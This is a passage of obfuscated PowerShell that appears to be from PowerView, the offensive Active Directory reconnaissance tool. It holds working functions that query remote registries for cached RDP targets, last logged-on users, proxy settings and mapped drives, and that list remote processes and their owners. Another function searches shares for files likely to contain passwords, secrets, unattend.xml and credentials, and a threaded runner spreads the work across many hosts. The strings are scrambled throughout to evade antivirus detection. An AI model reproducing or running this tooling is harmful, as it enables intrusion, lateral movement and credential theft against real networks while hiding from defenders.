            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-WMIRegProxy {


    [OutputType({"{5}{2}{4}{1}{3}{6}{0}" -f 'ttings','w','er','.ProxyS','Vie','Pow','e'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{2}{0}{1}" -f 'st','Name','Ho'}, {"{2}{3}{1}{0}"-f'e','tnam','dns','hos'}, {"{0}{1}" -f 'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                $WmiArguments = @{
                    ("{1}{0}"-f 'ist','L') = $True
                    ("{0}{1}"-f'Clas','s') = ("{2}{0}{1}"-f'dRegP','rov','St')
                    ("{0}{2}{1}"-f 'Nam','pace','es') = ((("{2}{3}{1}{0}" -f 'ault','def','root','{0}')) -F [chAr]92)
                    ("{1}{2}{0}" -f 'tername','Co','mpu') = $Computer
                    ("{1}{2}{0}"-f 'tion','ErrorA','c') = ("{1}{0}"-f'top','S')
                }
                if ($PSBoundParameters[("{1}{0}{2}"-f'ede','Cr','ntial')]) { $WmiArguments[("{1}{0}{2}"-f'edenti','Cr','al')] = $Credential }

                $RegProvider = Get-WmiObject @WmiArguments
                $Key = ((("{5}{6}{1}{9}{8}{10}{3}{11}{0}{13}{12}{7}{2}{4}"-f 'w','i','et','4W',' Settings','SOFTW','AREVd4M','d4Intern','osof','cr','tVd','indo','CurrentVersionV','sVd4'))  -CrepLACe 'Vd4',[CHaR]92)

                
                $HKCU = 2147483649
                $ProxyServer = $RegProvider.GetStringValue($HKCU, $Key, ("{0}{1}{2}" -f 'Pr','oxyS','erver')).sValue
                $AutoConfigURL = $RegProvider.GetStringValue($HKCU, $Key, ("{0}{3}{2}{1}" -f 'Au','gURL','Confi','to')).sValue

                $Wpad = ''
                if ($AutoConfigURL -and ($AutoConfigURL -ne '')) {
                    try {
                        $Wpad = (New-Object Net.WebClient).DownloadString($AutoConfigURL)
                    }
                    catch {
                        Write-Warning ('[Get'+'-W'+'MIRegPr'+'oxy] '+'Erro'+'r '+'c'+'onne'+'ct'+'ing '+'to'+' '+'Au'+'toConf'+'i'+'gU'+'RL '+': '+"$AutoConfigURL")
                    }
                }

                if ($ProxyServer -or $AutoConfigUrl) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty ("{1}{0}{3}{2}" -f 'o','C','e','mputerNam') $Computer
                    $Out | Add-Member Noteproperty ("{3}{2}{1}{0}"-f 'er','v','er','ProxyS') $ProxyServer
                    $Out | Add-Member Noteproperty ("{1}{3}{2}{0}" -f'figURL','A','oCon','ut') $AutoConfigURL
                    $Out | Add-Member Noteproperty ("{0}{1}" -f 'Wpa','d') $Wpad
                    $Out.PSObject.TypeNames.Insert(0, ("{4}{1}{3}{2}{0}" -f'gs','ew','in','.ProxySett','PowerVi'))
                    $Out
                }
                else {
                    Write-Warning ('[Get-WM'+'I'+'Re'+'gProxy] '+'No'+' '+'p'+'rox'+'y '+'s'+'etti'+'ngs '+'fou'+'nd '+'fo'+'r '+"$ComputerName")
                }
            }
            catch {
                Write-Warning ('[Get'+'-WMIRegPr'+'o'+'xy'+'] '+'E'+'rror '+'enum'+'e'+'rating'+' '+'pro'+'x'+'y '+'setti'+'ngs'+' '+'fo'+'r '+"$ComputerName "+': '+"$_")
            }
        }
    }
}


function Get-WMIRegLastLoggedOn {


    [OutputType({"{3}{0}{1}{4}{5}{6}{2}"-f 'owe','rView.Last','er','P','Logge','dOn','Us'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{1}{0}"-f 'stName','Ho'}, {"{0}{1}{2}"-f 'dnshost','n','ame'}, {"{1}{0}"-f 'ame','n'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ("{2}{0}{1}"-f 'c','alhost','lo'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            
            $HKLM = 2147483650

            $WmiArguments = @{
                ("{0}{1}" -f'Lis','t') = $True
                ("{1}{0}" -f 's','Clas') = ("{3}{0}{1}{2}" -f'td','RegP','rov','S')
                ("{2}{3}{0}{1}" -f'ac','e','Nam','esp') = ((("{2}{3}{5}{0}{1}{4}"-f'e','fau','ro','ot','lt','{0}d'))-f [ChaR]92)
                ("{0}{3}{2}{1}" -f'Co','me','rna','mpute') = $Computer
                ("{2}{1}{0}" -f'on','orActi','Err') = ("{1}{2}{0}"-f'ue','Si','lentlyContin')
            }
            if ($PSBoundParameters[("{1}{0}{2}"-f 'reden','C','tial')]) { $WmiArguments[("{1}{2}{0}"-f 'tial','Crede','n')] = $Credential }

            
            try {
                $Reg = Get-WmiObject @WmiArguments

                $Key = ((("{6}{0}{9}{15}{2}{11}{3}{10}{14}{7}{5}{12}{13}{4}{16}{17}{1}{8}" -f'OFT','ion{0}LogonU','rosof','{0','ti','Version{0}','S','ent','I','WAR','}','t','A','uthen','Windows{0}Curr','E{0}Mic','ca','t'))-F[CHAr]92)
                $Value = ("{4}{3}{1}{2}{0}" -f'dOnUser','ogg','e','astL','L')
                $LastUser = $Reg.GetStringValue($HKLM, $Key, $Value).sValue

                $LastLoggedOn = New-Object PSObject
                $LastLoggedOn | Add-Member Noteproperty ("{3}{0}{2}{1}"-f'uterNa','e','m','Comp') $Computer
                $LastLoggedOn | Add-Member Noteproperty ("{0}{2}{3}{1}"-f 'L','oggedOn','a','stL') $LastUser
                $LastLoggedOn.PSObject.TypeNames.Insert(0, ("{7}{2}{0}{5}{4}{8}{1}{6}{3}" -f 'iew.Las','OnU','rV','er','L','t','s','Powe','ogged'))
                $LastLoggedOn
            }
            catch {
                Write-Warning ('[Get'+'-'+'WM'+'IRe'+'gLas'+'tLog'+'gedOn] '+'Error'+' '+'openi'+'ng '+'rem'+'ot'+'e '+'regist'+'ry'+' '+'o'+'n '+"$Computer. "+'R'+'em'+'ote '+'regi'+'stry'+' '+'likely'+' '+'no'+'t '+'en'+'abled'+'.')
            }
        }
    }
}


function Get-WMIRegCachedRDPConnection {


    [OutputType({"{3}{4}{2}{1}{0}" -f'ion','t','PConnec','P','owerView.CachedRD'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{2}{0}{1}" -f'os','tName','H'}, {"{2}{1}{0}{3}"-f 'a','ostn','dnsh','me'}, {"{0}{1}"-f'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ("{1}{0}{2}"-f 'h','local','ost'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            
            $HKU = 2147483651

            $WmiArguments = @{
                ("{1}{0}"-f 'st','Li') = $True
                ("{1}{0}" -f 's','Clas') = ("{1}{2}{0}" -f'rov','Std','RegP')
                ("{0}{2}{1}"-f 'Nam','ce','espa') = ((("{0}{4}{1}{3}{2}" -f 'root','de','t','faul','xHn')).RePLaCe('xHn',[STRing][cHaR]92))
                ("{0}{1}{2}" -f'Comp','uterna','me') = $Computer
                ("{2}{1}{0}" -f 'ion','rAct','Erro') = ("{1}{0}" -f'op','St')
            }
            if ($PSBoundParameters[("{2}{1}{0}" -f'tial','reden','C')]) { $WmiArguments[("{2}{0}{1}"-f'denti','al','Cre')] = $Credential }

            try {
                $Reg = Get-WmiObject @WmiArguments

                
                $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match ((('S-1-'+'5-21-['+'0-9]+-'+'['+'0'+'-9'+']+-[0-9]+-[0-9]+12h')-RePLaCe '12h',[cHAr]36)) }

                ForEach ($UserSID in $UserSIDs) {
                    try {
                        if ($PSBoundParameters[("{1}{2}{0}"-f 'l','Credenti','a')]) {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID -Credential $Credential
                        }
                        else {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID
                        }

                        
                        $ConnectionKeys = $Reg.EnumValues($HKU,("$UserSID\Software\Microsoft\Terminal "+'Server'+' '+('Cl'+'ientcvYDefault').rEpLACe(([chaR]99+[chaR]118+[chaR]89),[sTRiNg][chaR]92))).sNames

                        ForEach ($Connection in $ConnectionKeys) {
                            
                            if ($Connection -match ("{0}{1}" -f 'MR','U.*')) {
                                $TargetServer = $Reg.GetStringValue($HKU, ("$UserSID\Software\Microsoft\Terminal "+'Serve'+'r'+' '+('C'+'lie'+'nt'+'kDxDefa'+'ult').RepLAcE(([cHAR]107+[cHAR]68+[cHAR]120),[STriNg][cHAR]92)), $Connection).sValue

                                $FoundConnection = New-Object PSObject
                                $FoundConnection | Add-Member Noteproperty ("{3}{1}{0}{2}" -f'uterNam','p','e','Com') $Computer
                                $FoundConnection | Add-Member Noteproperty ("{1}{2}{0}"-f 'Name','Use','r') $UserName
                                $FoundConnection | Add-Member Noteproperty ("{0}{1}" -f'U','serSID') $UserSID
                                $FoundConnection | Add-Member Noteproperty ("{0}{1}{2}" -f 'Targe','tSe','rver') $TargetServer
                                $FoundConnection | Add-Member Noteproperty ("{0}{1}{2}"-f'Usern','ameHi','nt') $Null
                                $FoundConnection.PSObject.TypeNames.Insert(0, ("{5}{4}{2}{6}{3}{1}{0}"-f'ion','nect','C','chedRDPCon','.','PowerView','a'))
                                $FoundConnection
                            }
                        }

                        
                        $ServerKeys = $Reg.EnumKey($HKU,("$UserSID\Software\Microsoft\Terminal "+'S'+'erver'+' '+('Client8aF'+'S'+'erver'+'s').replacE('8aF','\'))).sNames

                        ForEach ($Server in $ServerKeys) {

                            $UsernameHint = $Reg.GetStringValue($HKU, ("$UserSID\Software\Microsoft\Terminal "+'Serve'+'r '+"Client\Servers\$Server"), ("{2}{3}{1}{0}" -f't','Hin','U','sername')).sValue

                            $FoundConnection = New-Object PSObject
                            $FoundConnection | Add-Member Noteproperty ("{1}{0}{2}{3}"-f'o','C','mputerNam','e') $Computer
                            $FoundConnection | Add-Member Noteproperty ("{2}{0}{1}" -f 'a','me','UserN') $UserName
                            $FoundConnection | Add-Member Noteproperty ("{1}{0}"-f 'D','UserSI') $UserSID
                            $FoundConnection | Add-Member Noteproperty ("{3}{2}{1}{0}"-f'er','rv','getSe','Tar') $Server
                            $FoundConnection | Add-Member Noteproperty ("{1}{2}{0}" -f'int','Usernam','eH') $UsernameHint
                            $FoundConnection.PSObject.TypeNames.Insert(0, ("{0}{7}{3}{5}{4}{6}{2}{1}"-f 'Po','nection','Con','w.Cach','d','e','RDP','werVie'))
                            $FoundConnection
                        }
                    }
                    catch {
                        Write-Verbose ('[G'+'et-WMIR'+'e'+'gC'+'ach'+'edRDPConne'+'ction]'+' '+'E'+'rror'+': '+"$_")
                    }
                }
            }
            catch {
                Write-Warning ('[Get'+'-'+'W'+'MI'+'Reg'+'Cached'+'RDPConn'+'e'+'cti'+'on] '+'Error'+' '+'a'+'cce'+'ss'+'ing '+"$Computer, "+'l'+'ike'+'ly '+'i'+'n'+'suf'+'ficient '+'perm'+'issions'+' '+'o'+'r '+'fire'+'w'+'all'+' '+'r'+'ule'+'s '+'o'+'n '+'ho'+'st'+': '+"$_")
            }
        }
    }
}


function Get-WMIRegMountedDrive {


    [OutputType({"{2}{5}{4}{0}{1}{3}"-f 'ri','v','Powe','e','RegMountedD','rView.'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{1}{0}"-f'ame','HostN'}, {"{0}{2}{1}"-f 'dnshostna','e','m'}, {"{1}{0}" -f'e','nam'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ("{1}{0}{2}"-f 'hos','local','t'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            
            $HKU = 2147483651

            $WmiArguments = @{
                ("{0}{1}"-f'Lis','t') = $True
                ("{1}{0}" -f'lass','C') = ("{2}{1}{3}{0}" -f'rov','Re','Std','gP')
                ("{1}{0}" -f 'mespace','Na') = ((("{1}{0}{3}{2}" -f 't{','roo','lt','0}defau')) -F [chaR]92)
                ("{1}{3}{0}{2}"-f'n','Comput','ame','er') = $Computer
                ("{2}{1}{0}"-f'orAction','rr','E') = ("{0}{1}"-f 'Sto','p')
            }
            if ($PSBoundParameters[("{2}{3}{0}{1}" -f'nti','al','Cred','e')]) { $WmiArguments[("{1}{0}{2}"-f'ed','Cr','ential')] = $Credential }

            try {
                $Reg = Get-WmiObject @WmiArguments

                
                $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match (('S-1-5-2'+'1-['+'0-'+'9]+-[0-'+'9'+']+-'+'[0-9]+-[0-9]+{0}')  -f  [CHAR]36) }

                ForEach ($UserSID in $UserSIDs) {
                    try {
                        if ($PSBoundParameters[("{0}{1}{2}"-f'Creden','t','ial')]) {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID -Credential $Credential
                        }
                        else {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID
                        }

                        $DriveLetters = ($Reg.EnumKey($HKU, "$UserSID\Network")).sNames

                        ForEach ($DriveLetter in $DriveLetters) {
                            $ProviderName = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", ("{0}{3}{1}{2}" -f 'P','vide','rName','ro')).sValue
                            $RemotePath = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", ("{0}{1}{2}" -f'Rem','o','tePath')).sValue
                            $DriveUserName = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", ("{0}{1}"-f 'User','Name')).sValue
                            if (-not $UserName) { $UserName = '' }

                            if ($RemotePath -and ($RemotePath -ne '')) {
                                $MountedDrive = New-Object PSObject
                                $MountedDrive | Add-Member Noteproperty ("{0}{2}{1}{3}" -f'Co','puterN','m','ame') $Computer
                                $MountedDrive | Add-Member Noteproperty ("{1}{0}"-f'erName','Us') $UserName
                                $MountedDrive | Add-Member Noteproperty ("{1}{0}{2}"-f 'ser','U','SID') $UserSID
                                $MountedDrive | Add-Member Noteproperty ("{1}{0}{2}"-f'tte','DriveLe','r') $DriveLetter
                                $MountedDrive | Add-Member Noteproperty ("{2}{1}{3}{0}"-f'ame','rov','P','iderN') $ProviderName
                                $MountedDrive | Add-Member Noteproperty ("{0}{1}{2}" -f 'Remote','P','ath') $RemotePath
                                $MountedDrive | Add-Member Noteproperty ("{0}{3}{2}{1}"-f 'D','me','rNa','riveUse') $DriveUserName
                                $MountedDrive.PSObject.TypeNames.Insert(0, ("{3}{4}{2}{0}{1}{5}" -f 'M','o','.Reg','Pow','erView','untedDrive'))
                                $MountedDrive
                            }
                        }
                    }
                    catch {
                        Write-Verbose ('[Ge'+'t-WMI'+'Re'+'gMountedDrive'+'] '+'E'+'r'+'ror: '+"$_")
                    }
                }
            }
            catch {
                Write-Warning ('[Ge'+'t'+'-WMIRegM'+'ounte'+'d'+'D'+'rive] '+'E'+'rror'+' '+'a'+'ccessi'+'ng '+"$Computer, "+'li'+'ke'+'ly '+'ins'+'u'+'fficient '+'permiss'+'io'+'ns '+'or'+' '+'f'+'irewall'+' '+'rul'+'es '+'on'+' '+'h'+'ost: '+"$_")
            }
        }
    }
}


function Get-WMIProcess {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{2}{1}{0}" -f'ss','ldProce','SShou','P'}, '')]
    [OutputType({"{1}{2}{4}{0}{3}" -f'e','Pow','er','w.UserProcess','Vi'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{0}{1}{2}"-f 'Ho','stNa','me'}, {"{3}{1}{2}{0}" -f'me','ostn','a','dnsh'}, {"{0}{1}" -f'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ("{0}{2}{1}" -f 'loc','lhost','a'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                $WmiArguments = @{
                    ("{3}{2}{0}{1}"-f 'p','uterName','m','Co') = $ComputerName
                    ("{0}{1}"-f'Clas','s') = ("{3}{2}{4}{1}{0}" -f 'rocess','p','i','W','n32_')
                }
                if ($PSBoundParameters[("{1}{2}{0}" -f 'l','Credent','ia')]) { $WmiArguments[("{0}{1}{2}"-f 'Credenti','a','l')] = $Credential }
                Get-WMIobject @WmiArguments | ForEach-Object {
                    $Owner = $_.getowner();
                    $Process = New-Object PSObject
                    $Process | Add-Member Noteproperty ("{0}{1}{2}{3}"-f'Co','mpu','terN','ame') $Computer
                    $Process | Add-Member Noteproperty ("{2}{1}{0}" -f 'Name','ss','Proce') $_.ProcessName
                    $Process | Add-Member Noteproperty ("{1}{2}{0}" -f 'sID','Proce','s') $_.ProcessID
                    $Process | Add-Member Noteproperty ("{0}{1}"-f 'D','omain') $Owner.Domain
                    $Process | Add-Member Noteproperty ("{0}{1}"-f'U','ser') $Owner.User
                    $Process.PSObject.TypeNames.Insert(0, ("{1}{2}{3}{0}"-f 'ss','PowerVi','ew.Us','erProce'))
                    $Process
                }
            }
            catch {
                Write-Verbose ('[Get-WMIProc'+'e'+'s'+'s] '+'Erro'+'r '+'e'+'n'+'umerating'+' '+'remo'+'te '+'p'+'roc'+'esse'+'s '+'o'+'n '+"'$Computer', "+'acc'+'e'+'ss '+'lik'+'e'+'ly '+'de'+'nied'+': '+"$_")
            }
        }
    }
}


function Find-InterestingFile {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{4}{3}{1}"-f'Sh','s','PS','ldProces','ou'}, '')]
    [OutputType({"{2}{1}{0}{3}" -f 'r','we','Po','View.FoundFile'})]
    [CmdletBinding(DefaultParameterSetName = {"{0}{3}{1}{4}{2}"-f'Fi','cif','ation','leSpe','ic'})]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path = '.\',

        [Parameter(ParameterSetName = "f`ilESpEc`iFic`A`TiON")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f 'hTerms','arc','Se'}, {"{1}{0}"-f 'rms','Te'})]
        [String[]]
        $Include = @(("{1}{0}{2}" -f 's','*pa','sword*'), ("{3}{2}{0}{1}"-f 'itiv','e*','ns','*se'), ("{1}{2}{0}" -f'n*','*adm','i'), ("{1}{0}" -f 'login*','*'), ("{1}{0}"-f't*','*secre'), ("{3}{1}{0}{2}" -f'.x','nattend*','ml','u'), ("{0}{1}"-f '*','.vmdk'), ("{1}{0}{2}" -f'e','*cr','ds*'), ("{2}{0}{1}"-f'nti','al*','*crede'), ("{1}{0}" -f'fig','*.con')),

        [Parameter(ParameterSetName = "FilE`SP`EciF`Icat`I`ON")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastAccessTime,

        [Parameter(ParameterSetName = "FiLESp`ecifI`C`AtION")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastWriteTime,

        [Parameter(ParameterSetName = "Fil`ESp`EcifI`caT`Ion")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CreationTime,

        [Parameter(ParameterSetName = "OFFIced`O`CS")]
        [Switch]
        $OfficeDocs,

        [Parameter(ParameterSetName = "f`ReShEx`es")]
        [Switch]
        $FreshEXEs,

        [Parameter(ParameterSetName = "F`Ile`S`Pe`CIfICATIon")]
        [Switch]
        $ExcludeFolders,

        [Parameter(ParameterSetName = "fiLEsp`eciFI`c`AtiOn")]
        [Switch]
        $ExcludeHidden,

        [Switch]
        $CheckWriteAccess,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments =  @{
            ("{0}{1}"-f 'Recu','rse') = $True
            ("{0}{1}{2}" -f'Er','rorActio','n') = ("{3}{2}{0}{1}{4}"-f 'nt','inu','tlyCo','Silen','e')
            ("{0}{1}"-f'Inc','lude') = $Include
        }
        if ($PSBoundParameters[("{1}{0}{2}" -f'ficeDo','Of','cs')]) {
            $SearcherArguments[("{0}{1}{2}"-f 'Inc','lu','de')] = @(("{1}{0}"-f '.doc','*'), ("{1}{0}{2}" -f '.do','*','cx'), ("{1}{0}"-f '.xls','*'), ("{0}{1}{2}" -f'*','.','xlsx'), ("{1}{0}"-f 'ppt','*.'), ("{0}{1}" -f'*.','pptx'))
        }
        elseif ($PSBoundParameters[("{2}{1}{0}" -f 'XEs','reshE','F')]) {
            
            $LastAccessTime = (Get-Date).AddDays(-7).ToString(("{1}{2}{0}" -f'dd/yyyy','MM','/'))
            $SearcherArguments[("{1}{0}"-f 'de','Inclu')] = @(("{0}{1}" -f '*.ex','e'))
        }
        $SearcherArguments[("{1}{0}" -f'e','Forc')] = -not $PSBoundParameters[("{2}{1}{0}" -f'dden','eHi','Exclud')]

        $MappedComputers = @{}

        function Test-Write {
            
            [CmdletBinding()]Param([String]$Path)
            try {
                $Filetest = [IO.File]::OpenWrite($Path)
                $Filetest.Close()
                $True
            }
            catch {
                $False
            }
        }
    }

    PROCESS {
        ForEach ($TargetPath in $Path) {
            if (($TargetPath -Match ((("{5}{0}{3}{2}{4}{1}" -f'2Xh2Xh2Xh.*','.*','h2X','2X','h','2Xh')).rEPLaCe(([cHAr]50+[cHAr]88+[cHAr]104),[StRINg][cHAr]92))) -and ($PSBoundParameters[("{3}{1}{0}{2}"-f 'tia','eden','l','Cr')])) {
                $HostComputer = (New-Object System.Uri($TargetPath)).Host
                if (-not $MappedComputers[$HostComputer]) {
                    
                    Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
                    $MappedComputers[$HostComputer] = $True
                }
            }

            $SearcherArguments[("{0}{1}" -f 'Pa','th')] = $TargetPath
            Get-ChildItem @SearcherArguments | ForEach-Object {
                
                $Continue = $True
                if ($PSBoundParameters[("{3}{4}{2}{1}{0}"-f 'ders','Fol','ude','Ex','cl')] -and ($_.PSIsContainer)) {
                    Write-Verbose "Excluding: $($_.FullName) "
                    $Continue = $False
                }
                if ($LastAccessTime -and ($_.LastAccessTime -lt $LastAccessTime)) {
                    $Continue = $False
                }
                if ($PSBoundParameters[("{2}{0}{1}{3}"-f'i','m','LastWriteT','e')] -and ($_.LastWriteTime -lt $LastWriteTime)) {
                    $Continue = $False
                }
                if ($PSBoundParameters[("{1}{2}{0}"-f 'onTime','Crea','ti')] -and ($_.CreationTime -lt $CreationTime)) {
                    $Continue = $False
                }
                if ($PSBoundParameters[("{3}{1}{2}{0}"-f 's','eAc','ces','CheckWrit')] -and (-not (Test-Write -Path $_.FullName))) {
                    $Continue = $False
                }
                if ($Continue) {
                    $FileParams = @{
                        ("{0}{1}" -f 'P','ath') = $_.FullName
                        ("{0}{1}"-f'Ow','ner') = $((Get-Acl $_.FullName).Owner)
                        ("{1}{2}{3}{0}"-f 'cessTime','L','a','stAc') = $_.LastAccessTime
                        ("{1}{2}{0}{3}"-f 'e','LastWri','t','Time') = $_.LastWriteTime
                        ("{1}{0}{2}"-f'tio','Crea','nTime') = $_.CreationTime
                        ("{1}{0}"-f 'h','Lengt') = $_.Length
                    }
                    $FoundFile = New-Object -TypeName PSObject -Property $FileParams
                    $FoundFile.PSObject.TypeNames.Insert(0, ("{2}{1}{0}{4}{3}{5}"-f 'erView.','ow','P','dF','Foun','ile'))
                    $FoundFile
                }
            }
        }
    }

    END {
        
        $MappedComputers.Keys | Remove-RemoteConnection
    }
}








function New-ThreadedFunction {
    
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{9}{3}{7}{12}{5}{11}{6}{10}{8}{4}{0}"-f's','PSUseS','houldProce','F','n','tateC','ging','o','nctio','ss','Fu','han','rS'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [String[]]
        $ComputerName,

        [Parameter(Position = 1, Mandatory = $True)]
        [System.Management.Automation.ScriptBlock]
        $ScriptBlock,

        [Parameter(Position = 2)]
        [Hashtable]
        $ScriptParameters,

        [Int]
        [ValidateRange(1,  100)]
        $Threads = 20,

        [Switch]
        $NoImports
    )

    BEGIN {
        
        
        $SessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()

        
        
        $SessionState.ApartmentState = [System.Threading.ApartmentState]::STA

        
        
        if (-not $NoImports) {
            
            $MyVars = Get-Variable -Scope 2

            
            $VorbiddenVars = @('?',("{1}{0}"-f'gs','ar'),("{3}{1}{0}{2}" -f 'eFil','sol','eName','Con'),("{1}{0}"-f 'ror','Er'),("{0}{2}{1}{3}"-f 'E','Contex','xecution','t'),("{0}{1}"-f 'f','alse'),("{0}{1}" -f 'H','OME'),("{0}{1}" -f 'Ho','st'),("{1}{0}"-f'nput','i'),("{1}{0}{2}" -f 'tO','Inpu','bject'),("{3}{1}{0}{2}" -f 'mumAlia','axi','sCount','M'),("{0}{2}{1}{3}" -f 'Maximum','iveCou','Dr','nt'),("{2}{5}{0}{1}{4}{3}"-f 'r','ror','Maximu','t','Coun','mE'),("{3}{2}{1}{4}{0}"-f'Count','umFu','im','Max','nction'),("{6}{5}{1}{4}{3}{0}{2}"-f'ryCoun','Hi','t','to','s','aximum','M'),("{1}{2}{3}{0}" -f 'eCount','Max','imum','Variabl'),("{2}{1}{0}{3}" -f 'tio','Invoca','My','n'),("{1}{0}" -f 'll','nu'),'PID',("{0}{2}{3}{1}" -f'PSBoundPar','s','a','meter'),("{3}{2}{0}{1}" -f'dPa','th','an','PSComm'),("{0}{3}{2}{1}"-f'PSC','re','tu','ul'),("{2}{6}{1}{5}{3}{0}{4}" -f 'ParameterV','a','PSDe','t','alues','ul','f'),("{1}{0}" -f 'OME','PSH'),("{2}{0}{1}"-f 'ScriptR','oot','PS'),("{0}{2}{1}{3}" -f 'P','C','SUI','ulture'),("{1}{0}{3}{2}"-f'Versi','PS','able','onT'),'PWD',("{0}{1}"-f 'Shel','lId'),("{2}{1}{4}{3}{0}"-f'nizedHash','nc','Sy','o','hr'),("{0}{1}"-f 'tru','e'))

            
            ForEach ($Var in $MyVars) {
                if ($VorbiddenVars -NotContains $Var.Name) {
                $SessionState.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }

            
            ForEach ($Function in (Get-ChildItem Function:)) {
                $SessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
            }
        }

        
        
        

        
        $Pool = [RunspaceFactory]::CreateRunspacePool(1, $Threads, $SessionState, $Host)
        $Pool.Open()

        
        $Method = $Null
        ForEach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq ("{3}{0}{2}{1}"-f 'inI','e','nvok','Beg') }) {
            $MethodParameters = $M.GetParameters()
            if (($MethodParameters.Count -eq 2) -and $MethodParameters[0].Name -eq ("{0}{1}" -f'inp','ut') -and $MethodParameters[1].Name -eq ("{0}{1}" -f 'out','put')) {
                $Method = $M.MakeGenericMethod([Object], [Object])
                break
            }
        }

        $Jobs = @()
        $ComputerName = $ComputerName | Where-Object {$_ -and $_.Trim()}
        Write-Verbose "[New-ThreadedFunction] Total number of hosts: $($ComputerName.count) "

        
        if ($Threads -ge $ComputerName.Length) {
            $Threads = $ComputerName.Length
        }
        $ElementSplitSize = [Int]($ComputerName.Length/$Threads)
        $ComputerNamePartitioned = @()
        $Start = 0
        $End = $ElementSplitSize

        for($i = 1; $i -le $Threads; $i++) {
            $List = New-Object System.Collections.ArrayList
            if ($i -eq $Threads) {
                $End = $ComputerName.Length
            }
            $List.AddRange($ComputerName[$Start..($End-1)])
            $Start += $ElementSplitSize
            $End += $ElementSplitSize
            $ComputerNamePartitioned += @(,@($List.ToArray()))
        }

        Write-Verbose ('[Ne'+'w-'+'Thr'+'eadedF'+'unc'+'ti'+'on] '+'Tot'+'al '+'num'+'ber '+'o'+'f '+'thr'+'ea'+'ds/p'+'art'+'iti'+'ons: '+"$Threads")

        ForEach ($ComputerNamePartition in $ComputerNamePartitioned) {
            
            $PowerShell = [PowerShell]::Create()
            $PowerShell.runspacepool = $Pool

            
            $Null = $PowerShell.AddScript($ScriptBlock).AddParameter(("{0}{1}{2}"-f'C','omput','erName'), $ComputerNamePartition)
            if ($ScriptParameters) {
                ForEach ($Param in $ScriptParameters.GetEnumerator()) {
                    $Null = $PowerShell.AddParameter($Param.Name, $Param.Value)
                }
            }

            
            $Output = New-Object Management.Automation.PSDataCollection[Object]

            
            $Jobs += @{
                PS = $PowerShell
                Output = $Output
                Result = $Method.Invoke($PowerShell, @($Null, [Management.Automation.PSDataCollection[Object]]$Output))
            }
        }
    }

    END {
        Write-Verbose ("{4}{10}{6}{5}{1}{3}{8}{0}{9}{2}{7}" -f 's ','ction]','ecu',' Threa','[New-T','dedFun','rea','ting','d','ex','h')

        
        Do {
            ForEach ($Job in $Jobs) {
